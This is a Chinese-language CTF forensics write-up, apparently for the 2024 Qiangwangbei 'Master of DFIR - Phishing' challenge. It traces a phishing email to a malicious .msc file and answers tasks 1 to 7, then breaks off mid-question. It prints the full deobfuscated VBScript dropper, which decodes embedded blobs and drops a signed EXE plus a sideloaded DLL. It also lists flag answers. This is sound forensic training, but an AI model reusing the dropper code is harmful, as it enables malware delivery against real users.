--\x3e\\n\\n\u672c\u9898\u5b58\u5728\u6709\u52a8\u6001\u9644\u4ef6\u673a\u5236\uff0c\u672c\u9898\u76ee\u5206\u6790\u57fa\u4e8e [CTF-Archives/2024-qwbs8: \u7b2c\u516b\u5c4a \u201c\u5f3a\u7f51\u676f\u201d \u5168\u56fd\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b](https://github.com/CTF-Archives/2024-qwbs8) \u6240\u5b58\u6863\u7684\u9644\u4ef6 [master_of_dfir.zip - Release \u9644\u4ef6\u4e0b\u8f7d \xb7 CTF-Archives/2024-qwbs8](https://github.com/CTF-Archives/2024-qwbs8/releases/download/v0.1/master_of_dfir.zip) \u8fdb\u884c\u7f16\u5199\\n\\n\u611f\u8c22 [\u7a7a\u767d\u7237 - crazyman_army](https://crazymanarmy.github.io/) \u4e3a\u672c\u6b21\u5f3a\u7f51\u676f\u8d21\u732e\u7684 Master of DFIR \u7cfb\u5217\u9898\u76ee\\n\\n\u672c\u5206\u6790\u6240\u4f7f\u7528\u7684\u9898\u76ee\u4fe1\u606f\u57fa\u4e8e [QWB S8 2024 Quals(Jeopardy) - r3kapig\'s notion](https://r3kapig-not1on.notion.site/QWB-S8-2024-Quals-Jeopardy-133ec1515fb980a38f76ea397defd07d)\\n\\n<div style={{textAlign:\'center\'}}>\\n\\n![img](img/image_20241158-165825.png)\\n\\n![img](img/image_20241126-152604.png)\\n\\n![img](img/image_20241126-152650.png)\\n\\n</div>\\n\\n## Master of DFIR - Phishing\\n\\n:::info \u9898\u76ee\u63cf\u8ff0\\n\\n\u9965\u6e34 C \u732b\u662f\u4e00\u4e2a\u521a\u521a\u5165\u804c\u7684\u5458\u5de5\uff0c\u4f46\u662f\u6700\u8fd1\u4ed6\u53d1\u73b0\u81ea\u5df1\u7684\u7535\u8111\u53d8\u5f97\u8d8a\u6765\u8d8a\u5947\u602a\u3002\u53ef\u80fd\u7531\u4e8e\u662f\u4e4b\u524d\u4ed6\u63a5\u53d7\u7684\u4e00\u5c01\u5947\u602a\u7684\u90ae\u4ef6\uff0c\u4e8e\u662f\u9965\u6e34 C \u732b\u627e\u5230\u4e86\u4f60, \u4ed6\u5e0c\u671b\u4f60\u4f5c\u4e3a\u53d6\u8bc1 - \u5e94\u6025\u54cd\u5e94\u5927\u5e08\u53ef\u4ee5\u5e2e\u5fd9\u3002\u4f60\u53ef\u4ee5\u5b8c\u6210\u8c03\u67e5\u5230\u5e95\u53d1\u751f\u4e86\u4ec0\u4e48\u5e76\u4e14\u586b\u5199\u76f8\u5173\u7684\u8c03\u67e5\u62a5\u544a\u3002\\n\\n:::\\n\\n:::note Hints\\n\\n\u7b2c\u516d\u95ee\u6307\u5f97\u662f\u89e3\u5bc6\u5b8c\u8f7d\u8377\u540e\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a s******s \u7684\u51fd\u6570 (* \u4e0d\u4ee3\u8868\u6b63\u786e\u957f\u5ea6) \u7136\u540e\u4f60\u9700\u8981\u53bb\u63d0\u4ea4\u8be5\u51fd\u6570\u7684\u53c2\u6570, \u8fd9\u4e2a\u53c2\u6570\u662f\u9700\u8981\u89e3\u5b57\u7b26\u4e32\u6df7\u6dc6\u540e\u7684\u4e00\u6bb5\u5b57\u7b26\u4e32 \u5e76\u4e14\u5c06\u8fd9\u6bb5\u5b57\u7b26\u653e\u5230 cyberchef MD5 \u4e00\u4e0b\\n\\n\u7b2c 12 \u95ee\u7684\u6700\u7ec8\u8f7d\u8377\u6307\u5f97\u662f RAT \u7684\u8f7d\u8377 java \u7684\u9a6c\u548c\u672c\u9898\u76ee\u6beb\u65e0\u5173\u7cfb\\n\\n:::\\n\\n### task1\\n\\n> 1. \u653b\u51fb\u8005\u7684\u90ae\u7bb1\u662f\u4ec0\u4e48? (\u6ce8\u610f: MD5(\u653b\u51fb\u8005\u90ae\u7bb1), \u4ee5 cyberchef \u7684\u4e3a\u51c6) \u793a\u4f8b: 9b04d152845ec0a378394003c96da594\\n>\\n> 2. \u53d7\u5bb3\u8005\u7684\u90ae\u7bb1\u662f\u4ec0\u4e48? (\u6ce8\u610f: MD5(\u53d7\u5bb3\u8005\u90ae\u7bb1), \u4ee5 cyberchef \u7684\u4e3a\u51c6) \u793a\u4f8b: 9b04d152845ec0a378394003c96da594\\n\\n\u5728\u9644\u4ef6\u4e2d\u6709\u4e24\u4e2a\u6587\u4ef6\uff1a\\n\\n- \u5173\u4e8e\u7ec4\u7ec7\u53c2\u52a0\u7b2c\u516b\u5c4a \u201c\u5f3a\u7f51\u676f\u201d \u5168\u56fd\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b\u7684\u901a\u77e5. eml\\n- challenge.pcapng\\n\\n\u7531\u4e8e\u662f\u63d0\u53d6\u90ae\u7bb1\u4fe1\u606f\uff0c\u90a3\u4e48\u5173\u6ce8\u70b9\u653e\u5728 eml \u6587\u4ef6\u4e0a\\n\\n\u5728 eml \u6587\u4ef6\u7684 `From` \u5b57\u6bb5\u548c `To` \u5b57\u6bb5\u53ef\u4ee5\u5f97\u5230\u6536\u4ef6\u90ae\u7bb1\u5730\u5740\u548c\u53d1\u4fe1\u90ae\u7bb1\u5730\u5740\\n\\n```plaintext\\nFrom: \\"alice@flycode.cn\\" <alice@flycode.cn>\\nTo: bob <bob@flycode.cn>\\n```\\n\\n\u8ba1\u7b97\u54c8\u5e0c\\n\\n```plaintext\\n\u653b\u51fb\u8005\u7684\u90ae\u7bb1:\\nalice@flycode.cn    ->  a8cd5b4ba47e185d4a69a583fde84da5\\n\\n\u53d7\u5bb3\u8005\u7684\u90ae\u7bb1:\\nbob@flycode.cn      ->  b9cae449f959162f0297fa43b458bd66\\n```\\n\\n\u5373\u53ef\u5f97\u5230\u7b54\u6848\\n\\n```flag\\n1. a8cd5b4ba47e185d4a69a583fde84da5\\n2. b9cae449f959162f0297fa43b458bd66\\n```\\n\\n### task2\\n\\n> 1. \u653b\u51fb\u8005\u6240\u6295\u653e\u7684\u6587\u4ef6 md5 \u662f\u4ec0\u4e48? (\u6ce8\u610f: \u4ee5 md5sum \u7684\u7ed3\u679c\u4e3a\u51c6) \u793a\u4f8b: 33ec9f546665aec46947dca16646d48e\\n>\\n> 2. \u653b\u51fb\u8005\u6240\u6295\u653e\u6587\u4ef6\u7684\u5bc6\u7801\u662f\u4ec0\u4e48? \u793a\u4f8b: 000nb\\n\\n\u5728 eml \u6587\u4ef6\u4e2d\uff0c\u53ef\u4ee5\u53d1\u73b0\u6709\u9644\u4ef6\u7684\u5b58\u5728\\n\\n![img](img/image_20241141-154118.png)\\n\\n```bash\\nPS D:\\\\Downloads\\\\master_of_dfir> get-fileHash -Algorithm MD5 \\".\\\\ \u5173\u4e8e\u7ec4\u7ec7\u53c2\u52a0\u7b2c\u516b\u5c4a `\u201c\u5f3a\u7f51\u676f `\u201d \u5168\u56fd\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b\u7684\u901a\u77e5\uff0811 \u6708 2 \u65e5\u81f3 3 \u65e5\u4e3e\u884c\u7ebf\u4e0a\u8d5b\uff09.zip\\"\\n\\nAlgorithm       Hash                                                                   Path\\n---------       ----                                                                   ----\\nMD5             F436B02020FA59F3F71E0B6DCAC6C7D3                                       D:\\\\Downloads\\\\master_of_dfir \\\\ \u5173\u2026\\n```\\n\\n\u540c\u65f6\uff0c\u5728\u90ae\u4ef6\u6b63\u6587\u4e2d\\n\\n```plaintext\\n\u672c\u5c4a \\"\u5f3a\u7f51\u676f\\" \u62df\u4e8e 11 \u6708 02 \u65e5\u81f3 03 \u65e5\u4e3e\u884c\u7ebf\u4e0a\u8d5b\uff0c11 \u6708\u4e0b\u65ec\u4e3e\u884c\u7ebf\u4e0b\u8d5b\u3002 \u8bf7\u5404\u5b66\u6821\u3001 \u7f51\u4fe1\u4f01\u4e1a\u53ca\u673a\u6784\u5173\u6ce8 \u201c\u5f3a\u7f51\u7ade\u8d5b\u201d \u5fae\u4fe1\u516c\u4f17\u53f7\uff0c\u62a5\u540d\u53c2\u52a0\u7ade\u8d5b\u6d3b\u52a8\uff0c\u953b\u70bc\u961f\u4f0d\u3001 \u6df1\u5316\u4ea4\u6d41\uff0c \u8fdb\u4e00\u6b65\u63d0\u5347\u7f51\u7edc\u5b89\u5168\u4fdd\u969c\u80fd\u529b\u548c\u6c34\u5e73\u3002\u8be6\u7ec6\u9080\u8bf7\u6587\u4ef6\u89c1\u9644\u4ef6\u538b\u7f29\u5305, \u5bc6\u7801: 2024qwbs8\\n```\\n\\n\u53ef\u4ee5\u5f97\u5230\u9644\u4ef6\u4e2d\u538b\u7f29\u5305\u7684\u5bc6\u7801\\n\\n```flag\\n1. f436b02020fa59f3f71e0b6dcac6c7d3\\n2. 2024qwbs8\\n```\\n\\n### task3\\n\\n> 1. \u653b\u51fb\u8005\u6240\u4f7f\u7528\u7684\u653b\u51fb\u8f7d\u8377\u540e\u7f00\u662f\u4ec0\u4e48\uff1f \u793a\u4f8b: lnk\\n>\\n> 2. \u653b\u51fb\u8005\u6240\u4f7f\u7528\u7684\u653b\u51fb\u8f7d\u8377\u6587\u4ef6 windows \u9ed8\u8ba4\u7684\u6253\u5f00\u65b9\u5f0f\u7684\u5168\u79f0\u662f\u4ec0\u4e48? \u793a\u4f8b: Microsoft Windows Based Scripting Host\\n\\n\u4f7f\u7528\u5df2\u77e5\u5bc6\u7801\u5c06\u538b\u7f29\u5305\u8fdb\u884c\u89e3\u538b\uff0c\u5f97\u5230\uff1a\u5173\u4e8e\u7ec4\u7ec7\u53c2\u52a0\u7b2c\u516b\u5c4a \u201c\u5f3a\u7f51\u676f\u201d \u5168\u56fd\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b\u7684\u901a\u77e5\uff0811 \u6708 2 \u65e5\u81f3 3 \u65e5\u4e3e\u884c\u7ebf\u4e0a\u8d5b\uff09.msc\\n\\n`msc` \u6587\u4ef6\u7684\u6587\u4ef6\u7f29\u7565\u56fe\u7ecf\u8fc7\u7be1\u6539\uff0c\u6539\u4e3a\u4e86 `pdf` \u6587\u4ef6\u7684\u7f29\u7565\u56fe\uff0c\u53ef\u4ee5\u65ad\u5b9a\u4e3a\u7ecf\u8fc7\u4f2a\u9020\u7684\u6076\u610f\u6587\u4ef6\\n\\n`msc` \u6587\u4ef6\u7684\u9ed8\u8ba4\u6253\u5f00\u65b9\u5f0f\uff0c\u662f Microsoft \u7ba1\u7406\u63a7\u5236\u53f0\uff08Microsoft Management Console (MMC)\uff09\\n\\n```flag\\n1. msc\\n2. Microsoft Management Console\\n```\\n\\n### task4\\n\\n> 1. \u653b\u51fb\u8005\u6240\u6295\u653e\u6837\u672c\u7684\u521d\u59cb\u6267\u884c\u8bed\u53e5\u5728\u8be5\u653b\u51fb\u8f7d\u8377\u6587\u4ef6\u7684\u7b2c\u51e0\u884c? \u793a\u4f8b: 20\\n\\n\u76f4\u63a5\u4f7f\u7528\u6587\u672c\u7f16\u8f91\u5668\u6253\u5f00 `msc` \u6587\u4ef6\uff0c\u5728\u7b2c 92 \u884c\u53ef\u4ee5\u53d1\u73b0 Javascript \u8f7d\u8377\uff0c\u5728\u7b2c 97 \u884c\u53ef\u4ee5\u53d1\u73b0\u6267\u884c Javascript \u8f7d\u8377\u7684\u8bed\u53e5\\n\\n![img](img/image_20241158-155851.png)\\n\\n```flag\\n1. 97\\n```\\n\\n### task5\\n\\n> 1. \u7ecf\u8fc7\u521d\u59cb\u6267\u884c\u540e, \u653b\u51fb\u8005\u6240\u52a0\u8f7d\u7684\u7b2c\u4e8c\u90e8\u5206\u8f7d\u8377\u6240\u4f7f\u7528\u7684\u8bed\u8a00\u662f\u4ec0\u4e48? \u793a\u4f8b: javascript\\n\\n\u5c06\u7b2c 92 \u884c\u7684 Javascript \u8f7d\u8377\u63d0\u53d6\u51fa\u6765\\n\\n![img](img/image_20241100-160025.png)\\n\\n\u53ef\u4ee5\u53d1\u73b0\\n\\n![img](img/image_20241101-160100.png)\\n\\n\u5373\u53ef\u786e\u8ba4\u7b54\u6848\\n\\n```flag\\n1. VBScript\\n```\\n\\n### task6\\n\\n> 1. \u653b\u51fb\u8005\u6240\u8fdb\u884c\u7684\u7b2c\u4e8c\u90e8\u5206\u8f7d\u8377\u5176\u5c06\u767d EXE \u5b58\u5728\u4e86\u4ec0\u4e48\u5730\u65b9? (\u6ce8\u610f: \u9700\u8981\u63d0\u4f9b\u5b8c\u6210\u7684\u89e3\u6df7\u6dc6\u540e\u7684\u7b2c\u4e8c\u90e8\u5206\u8f7d\u8377 s*******s \u51fd\u6570\u7684\u53c2\u6570) \u63d0\u4ea4\u9700\u8981 MD5(\u53c2\u6570\u5185\u5bb9) \u4ee5 Cyberchef \u7ed3\u679c\u4e3a\u51c6 \u793a\u4f8b: 9b04d152845ec0a378394003c96da594\\n>\\n> 2. \u653b\u51fb\u8005\u6240\u8fdb\u884c\u7684\u7b2c\u4e8c\u90e8\u5206\u8f7d\u8377\u5176\u5c06\u9ed1 DLL \u5b58\u5728\u4e86\u4ec0\u4e48\u5730\u65b9? (\u6ce8\u610f: \u9700\u8981\u63d0\u4f9b\u5b8c\u6210\u7684\u89e3\u6df7\u6dc6\u540e\u7684\u7b2c\u4e8c\u90e8\u5206\u8f7d\u8377 s*******s \u51fd\u6570\u7684\u53c2\u6570) \u63d0\u4ea4\u9700\u8981 MD5(\u53c2\u6570\u5185\u5bb9) \u4ee5 Cyberchef \u7ed3\u679c\u4e3a\u51c6 \u793a\u4f8b: 9b04d152845ec0a378394003c96da594\\n\\n\u5c06 Javascript \u8f7d\u8377\u4e2d\u7684 VBScript \u63d0\u53d6\u51fa\u6765\uff0c\u53ef\u4ee5\u53d1\u73b0\u5176\u4e2d\u4f7f\u7528 ASCII \u7f16\u7801\u8fdb\u884c\u4e86\u6df7\u6dc6\\n\\n![img](img/image_20241103-160324.png)\\n\\n\u5728 [Visual Basic (VB.NET) - OneCompiler](https://onecompiler.com/vb/) \u4e2d\uff0c\u4f7f\u7528\u4ee5\u4e0b VB \u4ee3\u7801\u8fdb\u884c\u89e3\u6df7\u6dc6\\n\\n```vb\\nPublic Module Program\\n    Public Sub Main(args() As String)\\n        \'\u6309\u987a\u5e8f\u8ba1\u7b97\u6bcf\u4e2a Chr \u51fd\u6570\u5e76\u8fde\u63a5\u5b57\u7b26\u4e32\\n        Dim result As String = Chr(98) & Chr(Int(\\"105\\")) & Chr(110)\\n\\n        \' \u8f93\u51fa\u7ed3\u679c\\n        Console.WriteLine(result)\\n    End Sub\\nEnd Module\\n```\\n\\n:::warning\\n\\n\u5728 Visual Basic \u4e2d\uff0c\u539f\u8bed\u53e5\u4e3a `Chr(Int(\\"&H6f\\"))` \u9700\u8981\u6539\u4e3a `Chr(Convert.ToInt32(\\"6f\\", 16))`\\n\\n\u6216\u8005\u6539\u4e3a `Chr(&H6f)`\\n\\n\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u811a\u672c\u8f85\u52a9\u5904\u7406\\n\\n```python\\nwith open(\\"./data.txt\\", \\"r\\") as f:\\n    data = f.read().strip()\\n\\ndata = data.replace(\\"&H\\", \\"##\\")\\n\\ndata = data.split(\\"&\\")\\n\\ndata = [i.replace(\\"##\\", \\"&H\\") for i in data]\\n\\nfor i in range(len(data)):\\n    if \'Int(\\"&H\' in data[i]:\\n        data[i] = data[i].replace(\'Int(\\"&H\',\\"&H\\")\\n        data[i] = data[i].replace(\'\\")\', \\"\\")\\n\\nprint(\\"&\\".join(data))\\n```\\n\\n:::\\n\\n<details>\\n\\n<summary> \u89e3\u5bc6\u540e\u7684 vb \u4ee3\u7801 </summary>\\n\\n```vb\\nDim mscLL\\nmscLL=\\"_MSC\\"\\nFor i=1 to Len(mscLL) Step 4\\noFmXCTg=oFmXCTg & ChrW(CLng(\\"&\\"&Chr(72) & Mid(mscLL,i,4)))\\nNext\\nSet RTcxFmy=CreateObject(\\"Microsoft.XMLDOM\\")\\nRTcxFmy.Async=False\\nRTcxFmy.Load(oFmXCTg)\\nAJ8p\\nFunction Xk7fbp8v(inp)\\nDim q4XPbvoV\\nDim HxWK\\nSet q4XPbvoV=CreateObject(\\"MSXML2.DOMDocument\\")\\nSet HxWK=q4XPbvoV.createElement(\\"a\\")\\nHxWK.DataType=\\"bin.base64\\"\\nHxWK.Text=inp\\nXk7fbp8v=HxWK.nodeTypedValue\\nEnd Function\\nFunction AJ8p()\\nOn Error Resume Next\\nDim AgUvcCuHzzbl\\nDim DfAV40y\\nDim gwqhhV\\nDim JJNe\\nDim Mw7U\\nDim O8B1OrkTW\\nOMxa=\\"51734e8e7ec47ec753c252a07b2c516b5c4a201c5f3a7f51676f201d516856fd7f517edc5b895168631162188d5b7684901a77e5ff08003100316708003265e581f3003365e54e3e884c7ebf4e0a8d5bff09002e007000640066\\"\\nSet AgUvcCuHzzbl=CreateObject(\\"WScript.Shell\\")\\nSet DfAV40y=CreateObject(\\"Scripting.FileSystemObject\\")\\nO8B1OrkTW=AgUvcCuHzzbl.ExpandEnvironmentStrings(\\"%ProgramFiles%\\")\\nP59b6scR2TD9=O8B1OrkTW & \\"\\\\Cloudflare\\"\\nDfAV40y.CreateFolder(P59b6scR2TD9)\\ngwqhhV=P59b6scR2TD9 & \\"\\\\GUP.exe\\"\\nJJNe=P59b6scR2TD9 & \\"\\\\libcurl.dll\\"\\nFor i=1 to Len(OMxa) Step 4\\nFRURX=FRURX & ChrW(CLng(\\"&\\"&Chr(72) & Mid(OMxa,i,4)))\\nNext\\nMw7U=DfAV40y.GetSpecialFolder(2) & Chr(92) & FRURX\\nSet aZPHxtz4=RTcxFmy.selectNodes(\\"/MMC_ConsoleFile/BinaryStorage/Binary[@Name=\'CONSOLE_TREE\']\\" )\\nrqsgO2mBfu=aZPHxtz4(0).text\\nUoLAunW=Xk7fbp8v(rqsgO2mBfu)\\nDim jXnaWeLQ12\\nSet jXnaWeLQ12=CreateObject(\\"ADODB.Stream\\")\\njXnaWeLQ12.Type=1\\njXnaWeLQ12.Open\\njXnaWeLQ12.Write UoLAunW\\njXnaWeLQ12.SaveToFile Mw7U,2\\nAgUvcCuHzzbl.run \\"\\"\\"\\"& Mw7U &\\"\\"\\"\\",1,false\\nSet aZPHxtz4=RTcxFmy.selectNodes(\\"/MMC_ConsoleFile/BinaryStorage/Binary[@Name=\'CONSOLE_MENU\']\\" )\\nZe1C=aZPHxtz4(0).text\\nSet aZPHxtz4 = RTcxFmy.selectNodes(\\"/MMC_ConsoleFile/BinaryStorage/Binary[@Name=\'CONSOLE_PANE\']\\" )\\nJozMh9jg=aZPHxtz4(0).text\\nAnZUOdqFuMEw=Xk7fbp8v(Ze1C)\\ns4fr2y4Q7lvQ=Xk7fbp8v(JozMh9jg)\\nDim cHh5wARUext\\nSet cHh5wARUext=CreateObject(\\"ADODB.Stream\\")\\ncHh5wARUext.Type=1\\ncHh5wARUext.Open\\ncHh5wARUext.Write AnZUOdqFuMEw\\ncHh5wARUext.SaveToFile gwqhhV,2\\nDim BKzG1ldRw7\\nSet BKzG1ldRw7=CreateObject(\\"ADODB.Stream\\")\\nBKzG1ldRw7.Type=1\\nBKzG1ldRw7.Open\\nBKzG1ldRw7.Write s4fr2y4Q7lvQ\\nBKzG1ldRw7.SaveToFile JJNe,2\\nAgUvcCuHzzbl.run \\"\\"\\"\\"& gwqhhV &\\"\\"\\"\\" & \\"t 8.8.8.8\\",0,false\\nEnd Function\\nPublic Function i9Vu0(ByVal Value,ByVal Shift)\\ni9Vu0=Value\\nIf Shift>0 Then\\nIf Value>0 Then\\ni9Vu0=Int(i9Vu0/(2^Shift))\\nElse\\nIf Shift>31 Then\\ni9Vu0=0\\nElse\\ni9Vu0=i9Vu0 And &H7FFFFFFF\\ni9Vu0=Int(i9Vu0/(2^Shift))\\ni9Vu0=i9Vu0 Or 2^(31-Shift)\\nEnd If\\nEnd If\\nEnd If\\nEnd Function\\nPublic Function PIvwo4QDjBC(ByVal Value,ByVal Shift)\\nPIvwo4QDjBC=Value\\nIf Shift>0 Then\\nDim i\\nDim m\\nFor i=1 To Shift\\nm=PIvwo4QDjBC And &H40000000\\nPIvwo4QDjBC=(PIvwo4QDjBC And &H3FFFFFFF)*2\\nIf m<>0 Then\\nPIvwo4QDjBC=PIvwo4QDjBC Or &H80000000\\nEnd If\\nNext\\nEnd If\\nEnd Function\\nPublic Function eUBp1LoLYEMy(ByVal num)\\nConst rkLx=5570645\\nConst beweT2U=52428\\nConst d1=7\\nConst d2=14\\nDim t,u,out\\nt=(num Xor i9Vu0(num,d2)) And beweT2U\\nu=num Xor t Xor PIvwo4QDjBC(t,d2)\\nt=(u Xor i9Vu0(u,d1)) And rkLx\\nout=(u Xor t Xor PIvwo4QDjBC(t,d1))\\neUBp1LoLYEMy=out\\nEnd Function\\nPublic Function FTKaWvcYaGWt(ByRef MiCzi9())\\nDim i,fr,upJNNa,raw\\nDim a,b,c,d\\nDim YBx4PZLTHSQ1\\nDim EJSi8qJd0()\\nDim a2,b2\\nYBx4PZLTHSQ1=\\"\\"\\nFor i=0 To (UBound(MiCzi9)/4+1)\\nfr=i*4\\nIf fr>UBound(MiCzi9) Then\\nExit For\\nEnd If\\nupJNNa=0\\nupJNNa=upJNNa Or PIvwo4QDjBC(MiCzi9(fr+3),24)\\nupJNNa=upJNNa Or PIvwo4QDjBC(MiCzi9(fr+2),16)\\nupJNNa=upJNNa Or PIvwo4QDjBC(MiCzi9(fr+1),8)\\nupJNNa=upJNNa Or MiCzi9(fr+0)\\nraw=eUBp1LoLYEMy(upJNNa)\\na=Chr(i9Vu0((raw And &HFF000000),24))\\nb=Chr(i9Vu0((raw And 16711680),16))\\nc=Chr(i9Vu0((raw And 65280),8))\\nd=Chr(i9Vu0((raw And 255),0))\\nYBx4PZLTHSQ1=YBx4PZLTHSQ1+d+c+b+a\\nNext\\nFTKaWvcYaGWt=YBx4PZLTHSQ1\\nEnd Function\\nPublic Function t4zFxxgg22(MiCzi9)\\nDim CYhV8N(),Liefs(),arrayByte3(255)\\nDim Rp7jaY2jOqr(63),arrayLong5(63)\\nDim Mbt0mzk6(63),NALQp0Gu3\\nDim b7Z9n8,iter,VKkZEf,ZyvKLLyyHHD\\nDim YBx4PZLTHSQ1\\nMiCzi9=Replace(MiCzi9,vbCr,vbNullString)\\nMiCzi9=Replace(MiCzi9,vbLf,vbNullString)\\nZyvKLLyyHHD=Len(MiCzi9) Mod 4\\nIf InStrRev(MiCzi9,\\"==\\") Then\\nb7Z9n8=2\\nElseIf InStrRev(MiCzi9,\\"\\"+\\"=\\") Then\\nb7Z9n8=1\\nEnd If\\nFor ZyvKLLyyHHD=0 To 255\\nSelect Case ZyvKLLyyHHD\\nCase 65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90\\narrayByte3(ZyvKLLyyHHD)=ZyvKLLyyHHD-65\\nCase 97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122\\narrayByte3(ZyvKLLyyHHD)=ZyvKLLyyHHD-71\\nCase 48,49,50,51,52,53,54,55,56,57\\narrayByte3(ZyvKLLyyHHD)=ZyvKLLyyHHD+4\\nCase 43\\narrayByte3(ZyvKLLyyHHD)=62\\nCase 47\\narrayByte3(ZyvKLLyyHHD)=63\\nCase Else\\nEnd Select\\nNext\\nFor ZyvKLLyyHHD=0 To 63\\nRp7jaY2jOqr(ZyvKLLyyHHD)=ZyvKLLyyHHD*64\\narrayLong5(ZyvKLLyyHHD)=ZyvKLLyyHHD*4096\\nMbt0mzk6(ZyvKLLyyHHD)=ZyvKLLyyHHD*262144\\nNext\\nLiefs=StrConv(MiCzi9,vbFromUnicode)\\nReDim CYhV8N((((UBound(Liefs)+1)\\\\4)*3)-1)\\nFor iter=0 To UBound(Liefs) Step 4\\nNALQp0Gu3=Mbt0mzk6(arrayByte3(Liefs(iter)))+arrayLong5(arrayByte3(Liefs(iter+1)))+Rp7jaY2jOqr(arrayByte3(Liefs(iter+2)))+arrayByte3(Liefs(iter+3))\\nZyvKLLyyHHD=NALQp0Gu3 And 16711680\\nCYhV8N(VKkZEf)=ZyvKLLyyHHD\\\\65536\\nZyvKLLyyHHD=NALQp0Gu3 And 65280\\nCYhV8N(VKkZEf+1)=ZyvKLLyyHHD\\\\256\\nCYhV8N(VKkZEf+2)=NALQp0Gu3 And 255\\nVKkZEf=VKkZEf+3\\nNext\\nYBx4PZLTHSQ1=StrConv(CYhV8N,vbUnicode)\\nIf b7Z9n8 Then YBx4PZLTHSQ1=Left(YBx4PZLTHSQ1,Len(YBx4PZLTHSQ1)-b7Z9n8)\\nt4zFxxgg22=FTKaWvcYaGWt(StrConv(YBx4PZLTHSQ1,vbFromUnicode))\\nt4zFxxgg22=qY7AOEpU1wn(t4zFxxgg22,\\"~\\")\\nEnd Function\\nFunction qY7AOEpU1wn(str,chars)\\nDim fqX3dbudmU\\nDim XVZECKbx()\\nXVZECKbx=Split(str,chars)\\nfqX3dbudmU=UBound(XVZECKbx,1)\\nIf fqX3dbudmU<>0 Then\\nstr=Left(str,Len(str)-fqX3dbudmU)\\nEnd If\\nqY7AOEpU1wn=str\\nEnd Function\\n```\\n\\n</details>\\n\\n\u6839\u636e\u4ee3\u7801\uff0c\u53ef\u4ee5\u786e\u5b9a\u6587\u4ef6\u7684\u5b58\u653e\u4f4d\u7f6e\\n\\n```plaintext\\n/MMC_ConsoleFile/BinaryStorage/Binary[@Name=\'CONSOLE_MENU\'] -> 69b23cfd967d07c39d1517e2a3c37e34\\n\\n/MMC_ConsoleFile/BinaryStorage/Binary[@Name=\'CONSOLE_PANE\'] -> d2fabdcc28074462ac2379101836c938\\n```\\n\\n\u5373\u53ef\u786e\u5b9a\u7b54\u6848\\n\\n```flag\\n1. 69b23cfd967d07c39d1517e2a3c37e34\\n2. d2fabdcc28074462ac2379101836c938\\n```\\n\\n### task7\\n\\n> 1. \u653b\u51fb\u8005\u4f7f\u7528\u7684\u8fd9\u4e2a\u767d EXE \u52a0\u8f7d\u9ed1 DLL \u7684\u624b\u6cd5\u6240\u5bf9\u5e94\u7684 MITRE ATT&CK ID \u662f\u4ec0\u4e48? (\u6ce8\u610f: \u8bf7\u6ce8\u610f\u793a\u4f8b\u7684\u63d0\u793a\u63d0\u4ea4\u5927\u7c7b\u5373\u53ef\u4e0d\u9700\u8981\u7ec6\u5316\u5230\u5206\u9879) \u793a\u4f8b: T1000\\n\\n\u6839\u636e\u9898\u76ee\uff0c\u5df2\u7ecf\u786e\u5b9a\u4f7f\u7528\u7684\u624b\u6cd5\u4e3a \u767d\u52a0\u9ed1 \u65b9\u6848\uff0c\u5373\u4f7f\u7528\u767d\u540d\u5355\u7a0b\u5e8f\uff08\u4f8b\u5982\u8bc1\u4e66\u9a8c\u8bc1\uff09\u52a0\u8f7d\u6076\u610f DLL \u5e93\u6587\u4ef6\uff0c\u501f\u6b64\u89c4\u907f\u5b89\u5168\u8f6f\u4ef6\u7684\u68c0\u6d4b\\n\\n\u6839\u636e\u653b\u51fb\u624b\u6cd5\uff0c\u53ef\u4ee5\u786e\u5b9a\u5230 `MITRE ATT&CK ID T1574`\\n\\n:::info T1574 Hijack Execution Flow - \u52ab\u6301\u6267\u884c\u6d41\\n\\n\u5bf9\u624b\u53ef\u80fd\u901a\u8fc7\u52ab\u6301\u64cd\u4f5c\u7cfb\u7edf\u8fd0\u884c\u7a0b\u5e8f\u7684\u65b9\u5f0f\u6765\u6267\u884c\u81ea\u5df1\u7684\u6076\u610f\u8d1f\u8f7d\u3002\u52ab\u6301\u6267\u884c\u6d41\u7684\u76ee\u7684\u53ef\u80fd\u662f\u4e3a\u4e86\u6301\u4e45\u6027\uff0c\u56e0\u4e3a\u8fd9\u79cd\u52ab\u6301\u7684\u6267\u884c\u53ef\u80fd\u4f1a\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\u518d\u6b21\u53d1\u751f\u3002\u5bf9\u624b\u4e5f\u53ef\u80fd\u5229\u7528\u8fd9\u4e9b\u673a\u5236\u6765\u63d0\u5347\u6743\u9650\u6216\u89c4\u907f\u9632\u5fa1\u63aa\u65bd\uff0c\u4f8b\u5982\u5e94\u7528\u7a0b\u5e8f\u63a7\u5236\u6216\u5176\u4ed6\u6267\u884c\u9650\u5236\u3002\\n\\n\u5bf9\u624b\u52ab\u6301\u6267\u884c\u6d41\u7684\u65b9\u5f0f\u6709\u5f88\u591a\u79cd\uff0c\u5305\u62ec\u901a\u8fc7\u64cd\u63a7\u64cd\u4f5c\u7cfb\u7edf\u5b9a\u4f4d\u8981\u6267\u884c\u7684\u7a0b\u5e8f\u3002\u64cd\u4f5c\u7cfb\u7edf\u5b9a\u4f4d\u7a0b\u5e8f\u6240\u9700\u5e93\u6587\u4ef6\u7684\u65b9\u5f0f\u4e5f\u53ef\u80fd\u88ab\u62e6\u622a\u3002\u64cd\u4f5c\u7cfb\u7edf\u67e5\u627e\u7a0b\u5e8f / \u8d44\u6e90\u7684\u8def\u5f84\uff0c\u4f8b\u5982\u6587\u4ef6\u76ee\u5f55\uff0c\u6216\u5728 Windows \u4e2d\u7684\u6ce8\u518c\u8868\uff0c\u4e5f\u53ef\u80fd\u88ab\u6c61\u67d3\uff0c\u4ece\u800c\u5305\u62ec\u6076\u610f\u8d1f\u8f7d\u3002\\n\\n:::\\n\\n```flag\\n1. T1574\\n```\\n\\n### task8\\n\\n> 1. \u653b\u51fb\u8005\u6240\u4f7f\u7528\u7684\u9ed1 DLL \u52ab\u6301\u4e86\u539f\u59cb DLL \u7684\u54ea\u4e2a\u51fd\u6570? \u793a\u4f8b: 